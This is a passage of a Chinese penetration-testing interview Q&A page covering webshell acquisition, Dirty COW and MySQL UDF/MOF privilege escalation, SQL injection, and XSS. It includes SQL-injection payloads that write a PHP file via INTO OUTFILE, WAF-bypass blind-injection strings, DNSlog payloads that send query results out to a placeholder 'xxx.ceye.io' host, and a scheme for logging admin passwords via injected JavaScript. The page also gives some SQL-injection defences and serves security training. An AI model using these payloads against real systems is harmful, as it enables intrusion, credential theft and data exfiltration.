class="hljs-number">4</span>FFI绕过<br><span class="hljs-attribute">6</span>. 利用Bash破壳（CVE-<span class="hljs-number">2014</span>-<span class="hljs-number">6271</span>）漏洞绕过<br><span class="hljs-attribute">7</span>. 利用imap_open()绕过（CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">19518</span>）<br><span class="hljs-attribute">8</span>. 利用pcntl插件绕过<br></code></pre></td></tr></table></figure>

<h2 id="19-拿到webshell不出网情况下怎么办"><a href="#19-拿到webshell不出网情况下怎么办" class="headerlink" title="19-拿到webshell不出网情况下怎么办"></a>19-拿到webshell不出网情况下怎么办</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">reg上传去正向连接。或探测出网协议，如dns，<span class="hljs-keyword">icmp</span><br></code></pre></td></tr></table></figure>

<h2 id="20-脏牛提权漏洞"><a href="#20-脏牛提权漏洞" class="headerlink" title="20-脏牛提权漏洞"></a>20-脏牛提权漏洞</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">脏牛漏洞，Dirty COW， CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">5195</span><br>漏洞范围：Linux内核 &gt;= <span class="hljs-number">2.6</span>.<span class="hljs-number">22</span><br><br>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（<span class="hljs-keyword">copy</span>-<span class="hljs-keyword">on</span>-<span class="hljs-keyword">write</span>, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限<br><br>步骤：<br><span class="hljs-number">1</span>.查看系统版本和用户权限<br><span class="hljs-number">2</span>.下载<span class="hljs-built_in">exp</span>到本地  使用gcc -pthread dirty.<span class="hljs-keyword">c</span> -<span class="hljs-keyword">o</span> dirty -lcrypt命令对dirty.<span class="hljs-keyword">c</span>进行编译，生成一个dirty的可执行文件<br><span class="hljs-number">3</span>.执行./dirty 密码命令，即可进行提权<br></code></pre></td></tr></table></figure>

<h2 id="23-sqlmap的–level和–risk的区别"><a href="#23-sqlmap的–level和–risk的区别" class="headerlink" title="23-sqlmap的–level和–risk的区别"></a>23-sqlmap的–level和–risk的区别</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">level</span>级别越高发送的请求越多，并且在level3以上时会尝试对referer注入。<br><br>而risk则是风险系数，默认是<span class="hljs-number">1</span>会测试大部分的测试语句，<span class="hljs-number">2</span>会增加基于事件的测试语句，<span class="hljs-number">3</span>会增加<span class="hljs-keyword">OR</span>语句的QL注入测试。在有些时候，例如在<span class="hljs-keyword">UPDATE</span>的语句中，注入一个<span class="hljs-keyword">OR</span>的测试语句，可能导致更新的整个表，可能造成很大的风险<br></code></pre></td></tr></table></figure>

<h2 id="24-存储型XSS怎么利用？"><a href="#24-存储型XSS怎么利用？" class="headerlink" title="24-存储型XSS怎么利用？"></a>24-存储型XSS怎么利用？</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入beef进行钓鱼等<br>CORS（浏览器同源策略）<br>js =&gt;ajax 去请求其他网站的东西<br>test<span class="hljs-selector-class">.com</span> 根据浏览器的CORS策略 他只能在test.com里面请求东西  <br>test<span class="hljs-selector-class">.com</span> 调用ajax 去访问 xxxx<span class="hljs-selector-class">.com</span>  assdasd<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span>  如果目标的CORS头 默认不放行test<span class="hljs-selector-class">.com</span> 这样 test<span class="hljs-selector-class">.com</span> 的ajax请求就不会访问其他网站 <br></code></pre></td></tr></table></figure>

<h2 id="25-MYSQL-数据库的站，只有一个-80-端口开放？"><a href="#25-MYSQL-数据库的站，只有一个-80-端口开放？" class="headerlink" title="25-MYSQL 数据库的站，只有一个 80 端口开放？"></a>25-MYSQL 数据库的站，只有一个 80 端口开放？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">更改了端口  站库分离；3306端口不对外开放。<br></code></pre></td></tr></table></figure>

<h2 id="26-审查上传点的元素有什么意义？"><a href="#26-审查上传点的元素有什么意义？" class="headerlink" title="26-审查上传点的元素有什么意义？"></a>26-审查上传点的元素有什么意义？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">有些站点的上传文件类型限制是在前端实现的，这时只要增加上传类型就能<br>突破限制了。<br></code></pre></td></tr></table></figure>

<h2 id="27-3389-无法连接"><a href="#27-3389-无法连接" class="headerlink" title="27- 3389 无法连接"></a>27- 3389 无法连接</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">没开放 <span class="hljs-number">3389</span> 端口<span class="hljs-comment">;端口被修改;防护拦截;处于内网(需进行端口转发)</span><br></code></pre></td></tr></table></figure>

<h2 id="28-目标站无防护，上传图片可以正常访问，上传脚本格式访问则-403"><a href="#28-目标站无防护，上传图片可以正常访问，上传脚本格式访问则-403" class="headerlink" title="28-目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403"></a>28-目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">有可能Web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。<br></code></pre></td></tr></table></figure>

<h2 id="29-Mysql几种提权方式"><a href="#29-Mysql几种提权方式" class="headerlink" title="29-Mysql几种提权方式"></a>29-Mysql几种提权方式</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">Mysql_UDF 提权 <br>利用了root高权限，创建带有调用 cmd 的函数的 udf.dll 动态链接库，<br>导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd<br><br>限制条件：<br><span class="hljs-number">1</span>-MySQL 数据库没有开启安全模式（确认secure_file_priv=<span class="hljs-string">&#x27;&#x27;</span>是否为空）<br><span class="hljs-number">2</span>-已知的数据库账号具有对MySQL数据库insert和<span class="hljs-keyword">delete</span>的权限，最好是root最高权限。<br><span class="hljs-number">3</span>-shell有写入到数据库安装目录的权限。<br>MOF提权：<br>MOF提权是一个有历史的漏洞，基本上在Windows Server <span class="hljs-number">2003</span>的环境下才可以成功。提权的原理是C:<span class="hljs-regexp">/Windows/</span>system32<span class="hljs-regexp">/wbem/m</span>of/目录下的mof文件每隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS脚本，所以可以利用这个VBS脚本来调用CMD来执行系统命令，如果 MySQL有权限操作 mof 目录的话，就可以来执行任意命令了。<br></code></pre></td></tr></table></figure>

<h2 id="30-针对token的测试-会注意哪些方面？"><a href="#30-针对token的测试-会注意哪些方面？" class="headerlink" title="30-针对token的测试 会注意哪些方面？"></a>30-针对token的测试 会注意哪些方面？</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">针对<span class="hljs-keyword">token</span>的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息 泄露漏洞对它的获取，结合着发起组合攻击信息泄露有可能是缓存、日志、<span class="hljs-built_in">get</span>，也有可能是利用跨站很多跳转登录的都依赖<span class="hljs-keyword">token</span>，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了另外也可以结合着其它业务来描述<span class="hljs-keyword">token</span>的安全性及设计不好怎么被绕过比如抢红包业务之类的<br></code></pre></td></tr></table></figure>

<h2 id="31-token和refer横向对比-谁安全等级高？"><a href="#31-token和refer横向对比-谁安全等级高？" class="headerlink" title="31-token和refer横向对比 谁安全等级高？"></a>31-token和refer横向对比 谁安全等级高？</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">token安全等级更高，因为并不是任何服务器都可以取得<span class="hljs-built_in">ref</span>erer，如果从HTTPS 跳到HTTP，也不会发送<span class="hljs-built_in">ref</span>erer。并且FLASH一些版本中可以自定义<span class="hljs-built_in">ref</span>erer。但是token的话，要保证其足够随机且不可泄露。(不可预测性原则) <br></code></pre></td></tr></table></figure>

<h2 id="32-SQL注入写shell-单引号被过滤咋办？"><a href="#32-SQL注入写shell-单引号被过滤咋办？" class="headerlink" title="32-SQL注入写shell 单引号被过滤咋办？"></a>32-SQL注入写shell 单引号被过滤咋办？</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">写 shell: root 权限，GPC 关闭，知道文件路径outfile函数 </span><br><span class="language-xml">http://127.0.0.1:81/sqli.php?id=1 into outfile C:\\wamp64\\www\\phpinfo.php&#x27; FIELDS </span><br><span class="language-xml">TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml">http://127.0.0.1:81/sqli.php?id=-1 union select </span><br><span class="language-xml">1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile C:\\wamp64\\www\\phpinfo.php&#x27;` </span><br><span class="language-xml"></span><br><span class="language-xml">宽字节注入 </span><br><span class="language-xml">代替空格的方法 </span><br><span class="language-xml">%0a、%0b、%a0 等/**/ 等注释符<span class="hljs-tag">&lt;&gt;</span> </span><br></code></pre></td></tr></table></figure>

<h2 id="33-宽字节注入的原理？"><a href="#33-宽字节注入的原理？" class="headerlink" title="33-宽字节注入的原理？"></a>33-宽字节注入的原理？</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sql">产生原理 <br>在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于 <span class="hljs-number">0XBF27</span>是两个字符，在PHP中比如addslash和 magic_quotes_gpc 开启时，由于会对 <span class="hljs-number">0x27</span> 单引号进行转义，因此<span class="hljs-number">0xbf27</span>会变成<span class="hljs-number">0xbf5c27</span>,而数据进入数据库中时，由于 <span class="hljs-number">0XBF5C</span> 是一个另外的字符，因此\转义符号会被前面 <br>的 bf 带着&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句。 <br><br>根本原因 <br>character_set_client(客户端的字符集)和 character_set_connection(连接层的字符集)不同,或转换函数 <br>如iconv、mb_convert_encoding使用不当。 <br><br>解决办法 <br>统一数据库、Web 应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为 UTF<span class="hljs-number">-8</span>。或对数据进行正确的转义，<br>如mysql_real_escape_string<span class="hljs-operator">+</span>mysql_set_charset的使用。<br>防御方法：<br>关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。<br>常用的修复方案：<br>（<span class="hljs-number">1</span>）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 <span class="hljs-keyword">SQL</span> 语句中。<br>（<span class="hljs-number">2</span>）过滤危险的 <span class="hljs-keyword">SQL</span> 语句关键字。<br>（<span class="hljs-number">3</span>）确认每种数据的类型。<br>（<span class="hljs-number">4</span>）数据长度应该严格规定。<br>（<span class="hljs-number">5</span>）网站每个数据层的编码统一。<br>（<span class="hljs-number">6</span>）严格限制网站用户的数据库的操作权限。<br>（<span class="hljs-number">7</span>）避免网站显示 <span class="hljs-keyword">SQL</span> 错误信息。<br>（<span class="hljs-number">8</span>）在网站发布之前建议使用一些专业的 <span class="hljs-keyword">SQL</span> 注入检测工具进行检测。<br>（<span class="hljs-number">9</span>）升级 web 服务器运行平台软件补丁，建议使用 WAF 防护。<br></code></pre></td></tr></table></figure>

<h2 id="34-img标签除了onerror属性外，还有其他获取管理员路径的办法？"><a href="#34-img标签除了onerror属性外，还有其他获取管理员路径的办法？" class="headerlink" title="34-img标签除了onerror属性外，还有其他获取管理员路径的办法？"></a>34-img标签除了onerror属性外，还有其他获取管理员路径的办法？</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.服务器修改apache配置文件，配置.jpg文件以php方式来解析AddType application<span class="hljs-regexp">/x-httpd-php .jpg &lt;img src=http:/</span><span class="hljs-regexp">/xss.tv/</span><span class="hljs-number">1</span>.jpg&gt; 会以php方式来解析<br><br><span class="hljs-number">2</span>.c定一个远程的脚本文件，获取 referer <br></code></pre></td></tr></table></figure>

<h2 id="35-代码执行、文件读取、命令执行函数有哪些？"><a href="#35-代码执行、文件读取、命令执行函数有哪些？" class="headerlink" title="35-代码执行、文件读取、命令执行函数有哪些？"></a>35-代码执行、文件读取、命令执行函数有哪些？</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>）代码执行： <br>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function <br><br><span class="hljs-number">2</span>）文件读取： <br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span>,<span class="hljs-built_in">highlight_file</span>(),<span class="hljs-built_in">fopen</span>(),read <br><span class="hljs-function"><span class="hljs-title">file</span><span class="hljs-params">()</span></span>,<span class="hljs-built_in">fread</span>(),<span class="hljs-built_in">fgetss</span>(), <span class="hljs-built_in">fgets</span>(),<span class="hljs-built_in">parse_ini_file</span>(),<span class="hljs-built_in">show_source</span>(),<span class="hljs-built_in">file</span>()等 <br><br><span class="hljs-number">3</span>)命令执行： <br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>, <span class="hljs-built_in">exec</span>(), <span class="hljs-built_in">shell_exec</span>(), <span class="hljs-built_in">passthru</span>() ,<span class="hljs-built_in">pcntl_exec</span>(), <span class="hljs-built_in">popen</span>(),<span class="hljs-built_in">proc_open</span>()<br></code></pre></td></tr></table></figure>

<h2 id="36-为什么aspx木马权限比asp大？"><a href="#36-为什么aspx木马权限比asp大？" class="headerlink" title="36-为什么aspx木马权限比asp大？"></a>36-为什么aspx木马权限比asp大？</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">aspx使用的是.<span class="hljs-keyword">net</span>技术。<span class="hljs-keyword">IIS</span>中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。<br></code></pre></td></tr></table></figure>

<h2 id="37-提权为何选择可读写目录？不用带空格的目录？"><a href="#37-提权为何选择可读写目录？不用带空格的目录？" class="headerlink" title="37-提权为何选择可读写目录？不用带空格的目录？"></a>37-提权为何选择可读写目录？不用带空格的目录？</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">因为<span class="hljs-built_in">exp</span>执行多半需要空格界定参数<br></code></pre></td></tr></table></figure>

<h2 id="38-有shell情况下如何使用xss实现对目标站的长久控制？"><a href="#38-有shell情况下如何使用xss实现对目标站的长久控制？" class="headerlink" title="38-有shell情况下如何使用xss实现对目标站的长久控制？"></a>38-有shell情况下如何使用xss实现对目标站的长久控制？</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">后台登录处加一段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记 录到一个生僻的路径的文件中或者直接发到自己的网站文件中。<span class="hljs-comment">(此方法适合有价值并且需要深入控 制权限的网络)</span>。 在登录后才可以访问的文件中插入XSS脚本<br></code></pre></td></tr></table></figure>

<h2 id="39-发现uid-x3D-100注入点，获取shell的思路？"><a href="#39-发现uid-x3D-100注入点，获取shell的思路？" class="headerlink" title="39-发现uid&#x3D;100注入点，获取shell的思路？"></a>39-发现uid&#x3D;100注入点，获取shell的思路？</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">有写入权限的，构造联合查询语句使用 using INTO <span class="hljs-keyword">OUTFILE</span>，可以将查询的输出重定向到系统的文件中，这样去写入WebShell使用sqlmap –os-<span class="hljs-keyword">shell</span>原理和上面一种相同，来直接获得一个<span class="hljs-keyword">Shell</span>，这样效率更高通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传<span class="hljs-keyword">Shell</span>.<br></code></pre></td></tr></table></figure>

<h2 id="40-如何拿一个站点的webshell？"><a href="#40-如何拿一个站点的webshell？" class="headerlink" title="40-如何拿一个站点的webshell？"></a>40-如何拿一个站点的webshell？</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">上传，后台编辑模板，<span class="hljs-keyword">sql</span>注入写文件，命令执行，代码执行，一些已经爆出的cms 漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等 <br></code></pre></td></tr></table></figure>

<h2 id="41-手工判断目标站是Windows还是Linux？"><a href="#41-手工判断目标站是Windows还是Linux？" class="headerlink" title="41-手工判断目标站是Windows还是Linux？"></a>41-手工判断目标站是Windows还是Linux？</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.Linux大小写敏感 Windows不敏感<br><br><span class="hljs-attribute">2</span>.通过Ping的值 TTL<br> <span class="hljs-attribute">Linux</span>值 <span class="hljs-number">64</span>或者<span class="hljs-number">255</span><br> <span class="hljs-attribute">win</span> <span class="hljs-number">32</span>   <span class="hljs-number">128</span><br> <span class="hljs-attribute">unix</span>   <span class="hljs-number">255</span><br></code></pre></td></tr></table></figure>

<h2 id="42-SVN-x2F-GIT-源代码泄露"><a href="#42-SVN-x2F-GIT-源代码泄露" class="headerlink" title="42.SVN&#x2F;GIT 源代码泄露"></a>42.<strong>SVN&#x2F;GIT</strong> 源代码泄露</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.在使用 SVN 管理本地代码过程中，会自动生成一个名为.svn 的隐藏文件<br>夹，其中包含重要的源代码信息<span class="hljs-regexp">/.git/</span>config<br><span class="hljs-number">2</span>.使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起git泄露漏洞<span class="hljs-regexp">/.svn/</span>entries<br></code></pre></td></tr></table></figure>

<h2 id="43-项目上漏洞扫描需注意哪些？"><a href="#43-项目上漏洞扫描需注意哪些？" class="headerlink" title="43.项目上漏洞扫描需注意哪些？"></a>43.项目上漏洞扫描需注意哪些？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">跟客户确认是否充许登录扫描、扫描并发连接数及线程数、是否充许暴力破确，什么时间扫描、通知客户备份一下数据，开启业务系统及网站运维监控，以免断机可及时恢复<br></code></pre></td></tr></table></figure>

<h2 id="44-Mysql注入点，工具对目标站点写一句话-需要哪些条件？"><a href="#44-Mysql注入点，工具对目标站点写一句话-需要哪些条件？" class="headerlink" title="44.Mysql注入点，工具对目标站点写一句话 需要哪些条件？"></a>44.Mysql注入点，工具对目标站点写一句话 需要哪些条件？</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">root权限、网站的绝对路径、需要数据库开启 secure_file_priv相当于 secure_file_priv的值为空，不为空不充许写入webshell（默认不开启，需要修改 <span class="hljs-keyword">my</span>.ini 配置文件）<br></code></pre></td></tr></table></figure>

<h2 id="45-为何一个mysql数据库的站，只有一个80端口开放"><a href="#45-为何一个mysql数据库的站，只有一个80端口开放" class="headerlink" title="45.为何一个mysql数据库的站，只有一个80端口开放"></a>45.为何一个mysql数据库的站，只有一个80端口开放</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、更改了数据库端口，没有扫描出来。<br><span class="hljs-attribute">2</span>、站库分离。<br><span class="hljs-attribute">3</span>、<span class="hljs-number">3306</span> 端口不对外开放<br></code></pre></td></tr></table></figure>

<h2 id="46-报错注入的函数？"><a href="#46-报错注入的函数？" class="headerlink" title="46.报错注入的函数？"></a>46.报错注入的函数？</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">updatexml、extractvalue、<span class="hljs-built_in">floor</span>、<span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure>

<h2 id="47-Post和Get都做了防注入，可以采用什么方式绕过？"><a href="#47-Post和Get都做了防注入，可以采用什么方式绕过？" class="headerlink" title="47-Post和Get都做了防注入，可以采用什么方式绕过？"></a>47-Post和Get都做了防注入，可以采用什么方式绕过？</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Cookies</span>注入绕过<br></code></pre></td></tr></table></figure>

<h2 id="48-SQL注入只能查帐号密码？"><a href="#48-SQL注入只能查帐号密码？" class="headerlink" title="48-SQL注入只能查帐号密码？"></a>48-SQL注入只能查帐号密码？</h2><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">最低权限都可以查找帐号和密码，如 mssql sa 权限可以获取系统权限，dbowner 可以获取 Webshell，<span class="hljs-keyword">public</span> 可以脱库；mysql root 权限、知道网站的绝对路径、数据库 my.ini 配置文件 secure_file_priv 值为空时，就可以获取 webshell 并执行操作系统命令。<br></code></pre></td></tr></table></figure>

<h2 id="49-sqlmap，怎么对一个注入点注入？"><a href="#49-sqlmap，怎么对一个注入点注入？" class="headerlink" title="49-sqlmap，怎么对一个注入点注入？"></a>49-sqlmap，怎么对一个注入点注入？</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.如果是 <span class="hljs-built_in">get</span> 注入，直接，sqlmap -u <span class="hljs-string">&quot;注入点网址&quot;</span>.<br>2.如果是 post 注入，可以 sqlmap –r <span class="hljs-string">&quot;burp 地址访问包” </span><br><span class="hljs-string">3.如果是 cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r &quot;</span>文件地址<span class="hljs-string">&quot;，记得加上—level 3参数</span><br></code></pre></td></tr></table></figure>

<h2 id="50-SQL注入的防护方法？"><a href="#50-SQL注入的防护方法？" class="headerlink" title="50-SQL注入的防护方法？"></a>50-SQL注入的防护方法？</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、涵数过滤，如!is_numeric 涵数 <span class="hljs-regexp">//</span>判断变量 id 是否为数字<br><span class="hljs-number">2</span>、直接下载相关防范注入文件，通过 incloud 包含放在网站配置文件里面，如 <span class="hljs-number">360</span>、阿里云、腾迅提供的防注入脚本<br><span class="hljs-number">3</span>、使用白名单来规范化输入验证方法<br><span class="hljs-number">4</span>、采用 PDO 预处理 <br><span class="hljs-number">5</span>、使用 Waf 拦截<br></code></pre></td></tr></table></figure>

<h2 id="51-盲注IF被过滤怎么绕过？"><a href="#51-盲注IF被过滤怎么绕过？" class="headerlink" title="51-盲注IF被过滤怎么绕过？"></a>51-盲注IF被过滤怎么绕过？</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">如果 and <span class="hljs-keyword">if</span> 被 waf 拦截，我们可以使用内联注释来绕过函数的检测，如：<br>xor <span class="hljs-regexp">/*!if*/</span>(length(<span class="hljs-regexp">/*!database*/</span><span class="hljs-regexp">/*!()*/</span>)&gt;=<span class="hljs-number">1</span>,<span class="hljs-regexp">/*!sleep*/</span><span class="hljs-regexp">/*!(1)*/</span>,curdate())%<span class="hljs-number">23</span><br>^ <span class="hljs-regexp">/*!if*/</span>(length(<span class="hljs-regexp">/*!database*/</span><span class="hljs-regexp">/*!()*/</span>)&gt;=<span class="hljs-number">1</span>,<span class="hljs-regexp">/*!sleep*/</span><span class="hljs-regexp">/*!(1)*/</span>,curdate())%<span class="hljs-number">23</span><br><span class="hljs-regexp">/*!if*/</span>(length(<span class="hljs-regexp">/*!database*/</span><span class="hljs-regexp">/*!()*/</span>)&gt;=<span class="hljs-number">1</span>,<span class="hljs-regexp">/*!sleep*/</span><span class="hljs-regexp">/*!(1)*/</span>,curdate())%<span class="hljs-number">23</span><br>and case when <span class="hljs-number">1</span>!=<span class="hljs-number">0</span> then <span class="hljs-regexp">/*!sleep*/</span><span class="hljs-regexp">/*!(5)*/</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> end %<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<h2 id="52-SQL注入无回显，利用DNSlog如何构造？"><a href="#52-SQL注入无回显，利用DNSlog如何构造？" class="headerlink" title="52-SQL注入无回显，利用DNSlog如何构造？"></a>52-SQL注入无回显，利用DNSlog如何构造？</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于<br>防火墙的存在，容易被封禁 IP，可以尝试调整请求频率，有条件的使用代理池<br>进行请求。<br><span class="hljs-number">2</span>.此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域<br>名中，然后读取 DNS 解析时的日志，来获取想要的信息。<br><span class="hljs-number">3</span><span class="hljs-selector-class">.Mysql</span> 中利用<span class="hljs-built_in">load_file</span>()构造payload<br>‘ and <span class="hljs-built_in">if</span>((select load_file(concat(‘\\\\’,(select <br>database()),’<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.ceye</span><span class="hljs-selector-class">.io</span>\\abc’))),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)#<br><span class="hljs-number">4</span><span class="hljs-selector-class">.Mssql</span> 下利用 master.<span class="hljs-selector-class">.xp_dirtree</span> 构造 payload<br>DECLARE <span class="hljs-keyword">@host</span> varchar(<span class="hljs-number">1024</span>);SELECT <span class="hljs-keyword">@host</span>=(SELECT <br>db_name())+’.xxx.ceye.io’;<span class="hljs-built_in">EXEC</span>(‘master..xp_dirtree”\’+@host+’ \foobar$”‘);<br></code></pre></td></tr></table></figure>

